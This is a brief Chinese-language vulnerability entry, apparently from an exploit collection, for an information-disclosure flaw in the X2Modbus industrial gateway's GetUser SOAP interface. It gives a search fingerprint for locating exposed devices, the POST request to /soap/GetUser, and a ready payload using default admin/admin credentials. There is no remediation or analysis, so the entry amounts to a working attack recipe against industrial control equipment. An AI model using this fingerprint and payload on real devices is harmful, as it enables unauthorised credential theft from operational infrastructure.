# X2Modbus网关-GetUser接口存在敏感信息泄露

X2Modbus ｜ 信息泄露 ｜ —
- **指纹**：`server="SunFull-Webs"`
- **请求**：`POST /soap/GetUser HTTP/1.1`

**Payload**
```
<GetUser><User Name="admin" Password="admin"/></GetUser>
```